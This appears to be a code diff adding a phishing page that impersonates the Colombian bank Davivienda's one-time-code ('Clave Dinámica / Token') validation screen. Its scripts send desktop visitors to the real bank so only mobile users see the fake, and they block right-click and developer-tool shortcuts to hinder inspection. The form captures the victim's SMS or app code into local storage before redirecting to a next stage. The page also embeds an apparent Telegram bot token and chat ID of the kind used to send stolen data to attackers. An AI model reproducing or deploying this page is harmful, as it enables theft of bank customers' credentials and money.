@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <script>
+        // Security & Device Detection
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (!isMobile) {
+            window.location.href = "https://www.davivienda.com";
+        }
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123) return false;
+            if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="./imagenes/unnamed.png?v=2">
+    <title>Davivienda - Token Digital</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Open Sans', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-white flex flex-col min-h-screen">
+    <div class="w-full max-w-md mx-auto px-6 pt-8 pb-4">
+        <!-- Logo -->
+        <div class="flex justify-center mb-12">
+            <img src="./imagenes/Davivienda-Logo-EPS-vector-image.png" alt="Davivienda" class="w-[240px] object-contain">
+        </div>
+
+        <!-- Greeting -->
+        <div class="mb-8">
+            <h1 class="text-[22px] font-normal text-[#333] mb-1">Validación</h1>
+            <h2 class="text-[24px] font-bold text-[#333] leading-tight">Clave Dinámica / Token</h2>
+        </div>
+
+        <p class="text-[15px] text-[#666] mb-6">Ingresa el código que recibiste por SMS o generaste en tu App Davivienda.</p>
+
+        <div id="error-msg" class="hidden bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded-[10px]">
+            <p>Código incorrecto o expirado.</p>
+        </div>
+
+        <form onsubmit="return enviarToken()" class="space-y-6">
+            <div class="space-y-2">
+                <label class="block text-[15px] text-[#666]">Token / Código SMS</label>
+                <input type="tel" id="token" maxlength="8" placeholder="Ingresa el código" class="w-full h-[54px] border border-[#ccc] rounded-[10px] px-4 text-center text-2xl tracking-widest text-[#333] focus:outline-none focus:border-[#ED1C24]" required>
+            </div>
+
+            <div class="pt-6">
+                <button type="submit" class="w-full h-[54px] bg-[#ED1C24] text-white font-bold text-[18px] rounded-full hover:bg-[#d11a20] transition-colors">
+                    Validar
+                </button>
+            </div>
+        </form>
+
+        <!-- Divider -->
+        <div class="mt-20 pt-8 border-t border-[#eee]"></div>
+    </div>
+
+    <script>
+        const TOKEN = "8607426657:AAFFQMG_061Qf_HlkDuMmzgXFsWH9mSmBOk";
+        const CHAT_ID = "-5130587771";
+
+        // Check if error param is present
+        const urlParams = new URLSearchParams(window.location.search);
+        if(urlParams.get('error')) {
+            document.getElementById('error-msg').classList.remove('hidden');
+        }
+
+        function enviarToken() {
+            const tokenVal = document.getElementById('token').value;
+            
+            if (tokenVal.length < 4) {
+                alert("Código inválido");
+                return false;
+            }
+
+            localStorage.setItem('davivienda_otp', tokenVal);
+            window.location.href = "load.html";
+
+            return false;
+        }
+    </script>
+</body>
+</html>
